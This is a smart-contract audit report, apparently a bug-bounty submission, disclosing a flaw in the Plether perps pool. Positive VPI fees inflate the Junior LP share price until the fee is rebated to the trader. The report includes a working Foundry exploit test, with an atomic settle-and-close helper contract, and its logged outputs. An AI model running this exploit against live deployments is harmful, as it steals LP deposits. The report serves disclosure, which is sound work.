# \#98277 [SC-Critical] Attacker steals Junior principal by redeeming shares priced with VPI the pool later rebates to them

**Submitted on Nov 6th 2026 at 16:43:52 UTC by @oxfuje for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98277
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief
When a trader opens a position that pushes skew, the trader pays a VPI fee, and the pool counts it as LP money right away. When the same position is later closed, the pool pays that fee back to the trader as a rebate. Between those two moments, the LP share price includes money the pool is about to give back. An attacker who is both an LP and a trader opens a position, redeems their LP shares at the raised price, and then closes the position to get the fee back. The LPs who stay pay for both: the attacker's extra redemption and the full rebate. They end up with less than they deposited. The attacker holds the position for only about a few seconds, so it carries almost no price risk; only the redeem request has to be queued in advance.

## Impact
Direct theft of LP deposits.

The attacker is exposed to the market at the shortest for a few seconds (examples use 2 seconds). The redeem request is queued ahead of time. The attacker opens the position 2 seconds before the epoch boundary, then redeems and closes in the same transaction right at the boundary (first PoC test). So the attack carries almost no price risk, needs no keeper or other user, and can be repeated every epoch (from rotating accounts). Nothing in `settleLpEpoch` or `executeOrder` stops this. One cycle can take at most about 0.08% of pool assets times the attacker's share (the VPI at max skew: `vpiFactor × maxSkewRatio² / 2` = 0.01 × 0.4² / 2).

In the PoC, the victim deposits 450,000 USDG into Junior and earns nothing before the attack. After one attack cycle the victim can only redeem 449,721.91 USDG, so 278.09 USDG of their deposit is gone. The attacker ends the cycle 118.47 USDG richer than they started.

Where the money goes in one cycle:
- The attacker opens a 400k long and pays 798.40 USDG of VPI into the pool. The Junior share price rises.
- The attacker redeems their 55% of Junior at the raised price and gets 438.67 USDG more than they deposited.
- The attacker closes. The pool pays the full 798.40 USDG of VPI back to the attacker. The attacker also pays a 160 USDG close fee (4 bps of 400k), which stays in the pool. So the pool's net payout on the close is 638.40 USDG.
- The LPs who stay are left 438.67 − 160 = 278.67 USDG short. The victim holds 99.78% of what is left, so they lose 278.09 USDG.
- The attacker gains about 438.67 − 160 (open fee) − 160 (close fee) = 118.67 USDG (the PoC measures 118.47 USDG).

**Repeatable every epoch.** The 1h `DEPOSIT_COOLDOWN` applies per wallet (`SECURITY.md`, "wallet shares remain governed by the latest applicable activation timestamp"). An attacker with several accounts, each already past its cooldown, can therefore redeem from a different account at every hourly epoch, and the loss adds up. Each cycle's gain depends on the share redeemed in that cycle. The attacker's accounts that stay in the pool absorb their part of each loss, the same as other LPs.

**Attacker share needed.** The attacker only profits when their share of Junior exceeds `2 × fee / VPI per unit of size`, which is 40% of Junior at max skew from a zero-skew start. A Senior tranche makes that a smaller part of the pool. The Junior covenant (`HousePoolSeniorCapacityLib.juniorWithdrawalRatioCap`, `SECURITY.md` "Junior covenant") only lets the attacker redeem if the pool still meets `maxSeniorShareBps = 8000` afterwards. At the largest Senior tranche that allows it, 40% of Junior is about 12% of pool capital. Between 20% and 40% of Junior the LPs who stay still lose; the attacker just pays to make that happen.

**One cycle with the largest Senior tranche.** Example pool of 100M, sized so the pool is exactly 80/20 Senior/Junior after the attacker redeems (Senior = 4 × the victims' Junior). The rows use the PoC's params and formulas: zero starting skew, open to the 40% cap, VPI = 0.0008·pool, fee per side = 0.00016·pool, attacker net = pool·(0.0008·share − 0.00032), loss to LPs who stay = pool·(0.0008·share − 0.00016). Senior is not harmed (see the second PoC), so the whole loss falls on the victims' Junior.

| Attacker share of Junior | Senior / Junior before | Attacker Junior deposit | Attacker net | Loss to LPs who stay | Victims' Junior principal | Victims' loss |
|---|---|---|---|---|---|---|
| 30% | 73.7M / 26.3M | 7.9M | −8.0k | 8.0k USDG | 18.4M | 0.04% |
| 60% | 61.5M / 38.5M | 23.1M | +16.0k | 32.0k USDG | 15.4M | **0.21%** |
| 90% | 28.6M / 71.4M | 64.3M | +40.0k | 56.0k USDG | 7.1M | **0.78%** |

All of the VPI goes to Junior, so a smaller Junior tranche loses a larger share of its principal to the same attack.

Whenever the attack is profitable for the attacker, the LPs who stay always lose money from their deposits. Honest LPs who redeem while such positions are open also take part of this money without meaning to, so the leak happens even without an attacker.

## Root Cause
The pool pays open VPI back to the trader when the position closes (`CloseAccountingLib.sol:103-118`), but LP redemptions are priced as if that VPI already belongs to the LPs (`HousePoolAccountingLib.sol:59-79`), and unlike negative VPI (`ACCOUNTING_SPEC.md:821`) nothing stops an LP from redeeming it first.

## Vulnerability Details
VPI (virtual price impact) is a fee on trades that push skew (net long/short imbalance), and a rebate on trades that reduce it.

1. On a skew-increasing open, the trader pays VPI. The sidecar sends it to the pool as revenue and records it on the position as `position.vpiAccrued` (`CfdEngineSettlementSidecar.sol:453-463`, `:517`):

```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets,
            IHousePool.ClaimantInflowKind.Revenue,
            IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }
}
```

   `HousePool.recordClaimantInflow` adds it to `accountedAssets` (`HousePool.sol:641-643`). Senior only earns a fixed yield, so this revenue goes to Junior and raises the Junior share price.

2. The share price never subtracts the rebate the pool may have to pay back later. Nothing in how the pool values itself counts it:
   - NAV = the pool's cash, plus or minus what the pool would gain or lose if all open positions were settled now, minus what the pool owes traders (`HousePoolAccountingLib.sol:59-79`).
   - Open positions are valued only from their size, entry price, maximum payout and side (`TerminalNavBookV2.sol:228-235`, `:418-450`). The VPI paid is not part of that.
   - The amount held back from LP withdrawals is only the worst-case position loss, plus what the pool owes traders, plus other reserves (`HousePoolAccountingLib.sol:51-54`).

3. At each epoch settlement (`_settleLpEpoch`), the pool first updates the Junior and Senior balances (`_reconcile`), which adds the VPI as revenue. It then pays redemptions at the share price based on those updated balances (`HousePool.sol:833-850`, `:881`, `:1555-1600`). So an LP who redeems now receives their share of the VPI.

4. On a skew-reducing close, the trader gets a VPI rebate. The clamp only stops it at the amount the trader paid, so the trader gets all of it back (`CloseAccountingLib.sol:103-118`):

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

   The rebate is paid from pool cash (`CfdEngineSettlementSidecar.sol:621-623`):

```solidity
if (delta.actionRebatePaidAssets > 0) {
    IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
    clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
}
```

5. The `vpiRebateReserve` only protects negative VPI (`MarginClearinghouse.sol:48`, `CfdEngineSettlementSidecar.sol:466-478`). It does not cover this case.

So the pool counts the VPI as LP money while it still has to pay it back. The redeeming LP takes their share of it, and then the pool pays all of it back to the trader. The LPs who stay cover the difference out of their deposits.

Nothing forces the position to stay open for any minimum time. `settleLpEpoch` and `executeOrder` can run in the same transaction, and the SameBlock guard only compares an order's execution block with its own commit block, so it never ties settlement to execution. The gap between paying the VPI and getting it back can therefore shrink to about 2 seconds (open at the boundary minus 2s, settle and close at the boundary), which leaves the attacker almost no price risk.

**Why this is not intended design.** The docs say positive VPI goes to the pool (`WHITEPAPER.md:811`, "Pool when positive"), and that anticipated VPI stays out of the terminal price book and does not inflate LP NAV (`SECURITY.md:863`, `:871-872`; `ACCOUNTING_SPEC.md:1064-1066`). We accept both. The problem is that the developer also meant to stop round trips that pull VPI back out of the pool. `SECURITY.md:1443` says "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips", and the clamp's own comment says it prevents LP sandwich attacks (`CloseAccountingLib.sol:112-115`):

```solidity
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate.
```

That clamp only checks the trader side: the trader never gets back more than they paid. It does nothing about the LP side. Here the trader gets back exactly what they paid, but as an LP they redeemed in between and took their share of that same money. For the opposite case (negative VPI), the code keeps the money in a dedicated reserve that LPs "cannot extract" before it is settled (`ACCOUNTING_SPEC.md:795-799`, `:821`). Positive VPI gets no such protection.

The docs also say a rebate may be waived when the pool lacks free cash (`SECURITY.md:871-872`). That does not help here. In normal conditions the pool has the cash and pays the rebate in full, and the PoC shows the remaining LPs ending below their deposits.


**Different from the known depth issue.** The prior audit's info finding "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate" is about lowering pool depth so the rebate is bigger than what was paid. This bug does not need that. The second PoC test keeps pool depth the same from open to close: the rebate comes from the normal price curve, the clamp plays no part, and the victim still loses. The loss comes from the LP share price, not from the size of the rebate.

## Proof of Concept

## Attack Scenario
Deploy config: `vpiFactor = 0.01e18`, `maxSkewRatio = 0.4e18`, `executionFeeBps = 4`. Same numbers as the first PoC test: Junior holds about 1,001,000 USDG (victim 450k, attacker 550k, plus a 1,000 seed), so the attacker owns about 55% of Junior. Senior holds a 1,000 seed. Skew starts at 0.

1. The attacker requests a redeem of all their Junior shares with `TrancheVault.requestRedeem` (`TrancheVault.sol:606`) ahead of time and waits until it can be settled. The deposit cooldown is 1h (`TrancheVault.sol:38`, `:617`). The attacker holds no position during this wait.
2. 2 seconds before the epoch boundary, the attacker opens a 400k long with `OrderRouter.commitOrder` / `executeOrder` and pays 798.40 USDG of VPI (`vpiFactor × size² / poolSize / 2` = 0.01 × 400k² / 1,002k / 2). This raises the Junior share price. 1 second before the boundary, the attacker commits the close.
3. At the boundary, a helper contract calls the permissionless `OrderRouter.settleLpEpoch` and then `executeOrder` for the close, in one transaction:
   - Settle: the attacker redeems all their shares for 550,438.67 USDG, which is 438.67 more than they deposited (their ~55% share of the VPI). The settlement fee is 0 while the oracle is live (`HousePool.sol:1151-1152`).
   - Close: the pool pays the 798.40 VPI back to the attacker, and the attacker pays the 160 close fee, which stays in the pool. The LPs who stay are now 278.67 short in total; the victim's part is 278.09.
4. The attacker held the position for only 2 seconds, nets +118.47 USDG, and can repeat this every epoch from rotating accounts.

The redemption is limited by free pool assets, and the rebate by free pool cash (`CfdEnginePlanLib.sol:973-976`).

## Coded Proof of Concept

**Attacker model:** one unprivileged EOA that is both a Junior LP (55% of Junior) and a trader. It controls only its own deposit, redeem request, order size, and the permissionless `OrderRouter.executeOrder` / `OrderRouter.settleLpEpoch` calls, plus a small helper contract it deploys to call `settleLpEpoch` and then `executeOrder` for its close in one transaction. No admin action, `vm.store`, or `deal` on protocol contracts is used. Orders and LP settlement go through the real router path, and risk params match the deploy script (`vpiFactor = 0.01e18`, `maxSkewRatio = 0.4e18`, `executionFeeBps = 4`).

Steps to run:

1. Create the file `packages/perps/test/poc/OpenVpiBookedAsLpNav.t.sol`.
2. Copy the code below into it.
3. From the repo root, run:

```bash
cd packages/perps && forge test --match-path test/poc/OpenVpiBookedAsLpNav.t.sol -vvv
```

Flow (`test_FastAttack_SettleAndCloseSameTx`): the victim deposits 450k and the attacker deposits 550k into Junior. After the cooldown the attacker requests a full redeem. 3 seconds before the epoch boundary it commits a 400k LONG (max skew), and 2 seconds before it executes it, paying about 798 VPI into the pool. 1 second before it commits the close. At the boundary its helper contract settles the epoch (the attacker redeems at the raised price) and executes the close (the VPI comes back as a rebate) in one transaction. Finally the victim redeems.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {LegacyOrderRouterHarness} from "../utils/LegacyOrderRouterHarness.sol";
import {CfdMath} from "@plether/perps/CfdMath.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

/// Unprivileged attacker contract: calls the two permissionless router entrypoints back to back in ONE transaction,
/// at the same block.timestamp and block.number, proving no same-block / epoch-lock guard links them.
contract AtomicSettleClose {

    function run(LegacyOrderRouterHarness router, uint64 closeId, bytes[] calldata px) external {
        router.settleLpEpoch(px);
        router.executeOrder(closeId, px);
    }

}

/// Attacker: unprivileged account that is both a Junior LP and a trader. Controls only its own deposits,
/// redeem request, order sizes, and the permissionless executeOrder / settleLpEpoch calls.
contract OpenVpiBookedAsLpNavPoC is BasePerpTest {

    address attacker = address(0xA77);
    address victim = address(0xB0B);
    address seniorLp = address(0x5E1);

    // Deploy-script values: vpiFactor 0.01e18, maxSkewRatio 0.4e18, executionFeeBps 4 (engine default).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 100,
            initMarginBps: ((100) * 15) / 10,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _deposit(
        address lp,
        uint256 assets
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), assets);
        uint256 id = juniorVault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(id));
        router.settleLpEpoch(_mockPythUpdateData(1e8));
        uint256 claimable = juniorVault.claimableDepositRequest(id, lp);
        vm.prank(lp);
        shares = juniorVault.claimDeposit(id, claimable, lp, lp);
    }

    function _redeemAll(
        address lp,
        uint256 shares
    ) internal returns (uint256 assets) {
        vm.prank(lp);
        uint256 id = juniorVault.requestRedeem(shares, lp, lp);
        vm.warp(juniorVault.depositEpochStart(id));
        router.settleLpEpoch(_mockPythUpdateData(1e8));
        uint256 claimable = juniorVault.claimableRedeemRequest(id, lp);
        vm.prank(lp);
        assets = juniorVault.claimRedeem(id, claimable, lp, lp);
    }

    /// Stages one Pyth basket at an explicit publishTime WITHOUT advancing the clock. The unique tick satisfies bothc
    /// the PoolReconcile mark refresh (settle) and the close's post-commit historical parse in the same block.
    function _stageAt(
        uint256 publishTime
    ) internal returns (bytes[] memory px) {
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(uint64(1e8)), 0, int32(-8), publishTime, publishTime - 1);
        px = new bytes[](1);
        px[0] = abi.encode(uint256(1e8));
    }

    /// Minimal price-exposure variant: the attacker commits the close BEFORE the epoch boundary and then, at the
    /// boundary, calls settleLpEpoch and executeOrder(close) in ONE transaction (same block.timestamp/number) from an
    /// unprivileged helper contract. No keeper is involved; the attacker drives every permissionless call itself.
    function test_FastAttack_SettleAndCloseSameTx() public {
        uint256 victimDeposit = 450_000e6;
        uint256 attackerLpDeposit = 550_000e6;
        uint256 attackerMargin = 20_000e6;

        uint256 victimShares = _deposit(victim, victimDeposit);
        uint256 attackerShares = _deposit(attacker, attackerLpDeposit);
        _fundTrader(attacker, attackerMargin);

        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN());

        // Attacker queues a full redeem of its Junior shares.
        vm.prank(attacker);
        uint256 redeemId = juniorVault.requestRedeem(attackerShares, attacker, attacker);
        uint256 ES = juniorVault.depositEpochStart(redeemId); // epoch boundary

        uint256 size = 400_000e18;

        // Distinct, consecutive execution-chain blocks for each step (the SameBlock guard compares an order's
        // execution block to its own commit block only; it never links settle and execute).
        uint64 baseBlock = uint64(block.number) + 1;

        // T-3: commit skew-increasing open.
        vm.roll(baseBlock);
        vm.warp(ES - 3);
        uint256 poolBeforeOpen = pool.totalAssets();
        vm.prank(attacker);
        router.commitOrder(CfdTypes.Side.LONG, size, attackerMargin / 2, 1e8, false);
        uint64 openId = router.nextExecuteId();

        // Oracle tick the open executes against (publishTime ES-2, strictly after the open's ES-3 commit).
        uint256 openTick = ES - 2;
        // T-2: execute open. VPI is now booked into pool NAV.
        vm.roll(baseBlock + 1);
        vm.warp(openTick);
        vm.prank(attacker);
        router.executeOrder(openId, _stageAt(openTick));
        assertGt(_publicPosition(attacker).size, 0, "open executed");
        uint256 vpiPaid = pool.totalAssets() - poolBeforeOpen;
        console2.log("VPI paid on open                  ", vpiPaid);

        // T-1: commit the close (still pending at settle time).
        vm.roll(baseBlock + 2);
        vm.warp(ES - 1);
        vm.prank(attacker);
        router.commitOrder(CfdTypes.Side.LONG, size, 0, 0, true);
        uint64 closeId = router.nextExecuteId();

        // T (epoch boundary): settleLpEpoch + executeOrder(close) atomically in ONE tx, same block.
        // The close executes against the ES tick; one Pyth basket feeds both the PoolReconcile mark and the close.
        uint256 closeTick = ES;
        vm.roll(baseBlock + 3);
        vm.warp(closeTick);
        AtomicSettleClose atk = new AtomicSettleClose();
        atk.run(router, closeId, _stageAt(closeTick));
        assertEq(_publicPosition(attacker).size, 0, "close executed in same tx as settle");

        // Redeem funded at the VPI-inflated NAV; claim it.
        uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, attacker);
        assertEq(claimable, attackerShares, "full redeem funded by atomic settle");
        vm.prank(attacker);
        uint256 redeemed = juniorVault.claimRedeem(redeemId, claimable, attacker, attacker);

        uint256 chAfter = clearinghouse.balanceAssets(attacker);
        int256 attackerPnl =
            int256(settlementToken.balanceOf(attacker) + chAfter) - int256(attackerLpDeposit + attackerMargin);

        // Price-exposure window = span between the two oracle ticks the position was opened and closed at.
        console2.log("open execution oracle tick        ", openTick);
        console2.log("close execution oracle tick       ", closeTick);
        console2.log("price-exposure window (seconds)   ", closeTick - openTick);
        console2.log("attacker LP redeemed              ", redeemed);
        console2.log("attacker net PnL                  ", attackerPnl);

        // Victim exits and realises the loss.
        vm.warp(block.timestamp + 1);
        uint256 victimOut = _redeemAll(victim, victimShares);
        console2.log("victim deposit                    ", victimDeposit);
        console2.log("victim redeemed                   ", victimOut);
        console2.log("victim loss                       ", victimDeposit - victimOut);

        assertEq(closeTick - openTick, 2, "two-second price-exposure window");
        assertGt(vpiPaid, 0, "open VPI paid");
        assertGt(redeemed, attackerLpDeposit, "attacker redeemed above deposit");
        assertLt(victimOut, victimDeposit, "victim lost");
        assertGt(attackerPnl, 0, "attacker profit");
    }

    /// Same attack, but an unrelated Senior LP deposit settles in the same epoch as the attacker's redeem and
    /// replaces the withdrawn assets. Pool depth at the close equals depth at the open, so the lifetime clamp
    /// does not bind: the rebate is exactly the VPI paid, and the Junior victim still loses principal.
    function test_ConstantDepth_VictimStillLoses() public {
        uint256 victimDeposit = 450_000e6;
        uint256 attackerLpDeposit = 550_000e6;
        uint256 seniorDeposit = 550_000e6;
        uint256 attackerMargin = 20_000e6;

        uint256 victimShares = _deposit(victim, victimDeposit);
        uint256 attackerShares = _deposit(attacker, attackerLpDeposit);
        _fundTrader(attacker, attackerMargin);

        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN());

        // 1. Attacker queues a full redeem; an unrelated Senior LP queues a deposit for the same epoch.
        vm.prank(attacker);
        uint256 redeemId = juniorVault.requestRedeem(attackerShares, attacker, attacker);
        uint256 epochStart = juniorVault.depositEpochStart(redeemId);
        settlementToken.mint(seniorLp, seniorDeposit);
        vm.startPrank(seniorLp);
        settlementToken.approve(address(seniorVault), seniorDeposit);
        uint256 seniorId = seniorVault.requestDeposit(seniorDeposit, seniorLp, seniorLp);
        vm.stopPrank();
        assertEq(seniorVault.depositEpochStart(seniorId), epochStart, "same epoch");
        if (block.timestamp + 10 < epochStart) {
            vm.warp(epochStart - 10);
        }

        // 2. Attacker opens a skew-increasing LONG at max skew.
        uint256 size = 400_000e18;
        uint256 depthAtOpen = pool.totalAssets();
        vm.prank(attacker);
        router.commitOrder(CfdTypes.Side.LONG, size, attackerMargin / 2, 1e8, false);
        uint64 openId = router.nextExecuteId();
        bytes[] memory openPx = _mockPythUpdateData(1e8);
        vm.prank(attacker);
        router.executeOrder(openId, openPx);
        assertGt(_publicPosition(attacker).size, 0, "open executed");
        uint256 vpiPaid = pool.totalAssets() - depthAtOpen;
        console2.log("pool depth at open                ", depthAtOpen);
        console2.log("VPI paid on open                  ", vpiPaid);

        // 3. Settle: attacker redeems at the VPI-inflated NAV, Senior LP deposit refills the pool.
        vm.warp(epochStart);
        bytes[] memory settlePx = _mockPythUpdateData(1e8);
        vm.prank(attacker);
        router.settleLpEpoch(settlePx);
        uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, attacker);
        assertEq(claimable, attackerShares, "full redeem funded");
        vm.prank(attacker);
        uint256 redeemed = juniorVault.claimRedeem(redeemId, claimable, attacker, attacker);
        uint256 seniorClaimable = seniorVault.claimableDepositRequest(seniorId, seniorLp);
        assertEq(seniorClaimable, seniorDeposit, "senior deposit funded");
        vm.prank(seniorLp);
        uint256 seniorShares = seniorVault.claimDeposit(seniorId, seniorClaimable, seniorLp, seniorLp);
        console2.log("attacker LP deposit               ", attackerLpDeposit);
        console2.log("attacker LP redeemed              ", redeemed);

        // 4. Attacker closes at the same depth as the open.
        uint256 depthAtClose = pool.totalAssets();
        console2.log("pool depth at close               ", depthAtClose);
        uint256 rawRebate = CfdMath.getSkewCost(400_000e6, depthAtClose, 0.01e18);
        console2.log("raw (unclamped) close VPI rebate  ", rawRebate);
        uint256 chBeforeClose = clearinghouse.balanceAssets(attacker);
        vm.prank(attacker);
        router.commitOrder(CfdTypes.Side.LONG, size, 0, 0, true);
        uint64 closeId = router.nextExecuteId();
        bytes[] memory closePx = _mockPythUpdateData(1e8);
        vm.prank(attacker);
        router.executeOrder(closeId, closePx);
        assertEq(_publicPosition(attacker).size, 0, "close executed");
        uint256 chAfter = clearinghouse.balanceAssets(attacker);
        uint256 closeFee = 160e6; // 4 bps of 400k notional
        uint256 rebate = chAfter + closeFee - chBeforeClose;
        console2.log("rebate paid on close              ", rebate);

        int256 attackerPnl =
            int256(settlementToken.balanceOf(attacker) + chAfter) - int256(attackerLpDeposit + attackerMargin);
        console2.log("attacker net PnL                  ", attackerPnl);

        // 5. Passive LPs exit.
        vm.warp(block.timestamp + 1);
        uint256 victimOut = _redeemAll(victim, victimShares);
        console2.log("victim deposit                    ", victimDeposit);
        console2.log("victim redeemed                   ", victimOut);
        console2.log("victim loss                       ", victimDeposit - victimOut);

        vm.prank(seniorLp);
        uint256 seniorRedeemId = seniorVault.requestRedeem(seniorShares, seniorLp, seniorLp);
        vm.warp(seniorVault.depositEpochStart(seniorRedeemId));
        router.settleLpEpoch(_mockPythUpdateData(1e8));
        uint256 seniorRedeemClaimable = seniorVault.claimableRedeemRequest(seniorRedeemId, seniorLp);
        vm.prank(seniorLp);
        uint256 seniorOut = seniorVault.claimRedeem(seniorRedeemId, seniorRedeemClaimable, seniorLp, seniorLp);
        console2.log("senior LP deposit                 ", seniorDeposit);
        console2.log("senior LP redeemed                ", seniorOut);

        // Depth unchanged (within 0.1%), so no depth manipulation.
        assertApproxEqRel(depthAtClose, depthAtOpen, 0.001e18, "depth at close == depth at open");
        // Rebate is the unclamped curve value (slightly BELOW the VPI paid, since depth is marginally higher):
        // the lifetime clamp does not bind, and the trader gets back what it paid to within 0.05%.
        assertApproxEqAbs(rebate, rawRebate, 0.01e6, "rebate == raw curve value");
        assertLe(rebate, vpiPaid, "clamp not binding");
        assertApproxEqRel(rebate, vpiPaid, 0.0005e18, "rebate ~= VPI paid");
        assertGt(redeemed, attackerLpDeposit, "attacker redeemed above deposit");
        assertLt(victimOut, victimDeposit, "victim lost");
        assertGt(attackerPnl, 0, "attacker profit");
    }

}
```

Output:

```
[PASS] test_FastAttack_SettleAndCloseSameTx() (gas: 11719249)
Logs:
  VPI paid on open                   798403193
  open execution oracle tick         1709546398
  close execution oracle tick        1709546400
  price-exposure window (seconds)    2
  attacker LP redeemed               550438673179
  attacker net PnL                   118472695
  victim deposit                     450000000000
  victim redeemed                    449721908750
  victim loss                        278091250
```

In this 2-second cycle the attacker redeems 438.67 USDG above its deposit (its 55% share of the VPI), gets the VPI back on the close minus the close fee, and nets +118.47 USDG. The passive Junior LP loses 278.09 USDG of principal (about 0.06%). The cycle can be repeated every epoch from rotating accounts.

**Second test: same harm at constant pool depth.** `test_ConstantDepth_VictimStillLoses` runs the same attack, but an unrelated Senior LP deposits 550k in the same epoch as the attacker's redeem, so the money the attacker takes out is put back right away. Pool depth at the close (1,002,359.73) is the same as at the open (1,002,000.00) within 0.04%. The trader gets back 798.11 USDG, which is just what the normal price curve gives at that depth and slightly less than the 798.40 it paid, so the lifetime clamp plays no part. The Junior victim still ends 282.81 USDG below its deposit and the attacker still nets +118.38 USDG, so this is not the known depth-manipulation issue: the loss comes only from the LP share price counting VPI that is later paid back.

**Attacker model (second test):** the same unprivileged LP + trader as above; the Senior LP is an unrelated honest user making an ordinary deposit, which the attacker does not control or need to fund.

Output (second test):

```
[PASS] test_ConstantDepth_VictimStillLoses() (gas: 14155384)
Logs:
  pool depth at open                 1002000000000
  VPI paid on open                   798403193
  attacker LP deposit                550000000000
  attacker LP redeemed               550438673045
  pool depth at close                1002359730148
  raw (unclamped) close VPI rebate   798116660
  rebate paid on close               798113994
  attacker net PnL                   118383846
  victim deposit                     450000000000
  victim redeemed                    449717185265
  victim loss                        282814735
  senior LP deposit                  550000000000
  senior LP redeemed                 550010045706
```

The Senior LP does not lose: Junior takes losses first, and the Senior LP even earns its normal 10.05 USDG coupon (part of that coupon, a few USDG, is why the victim's loss here is a little larger than in the first test).

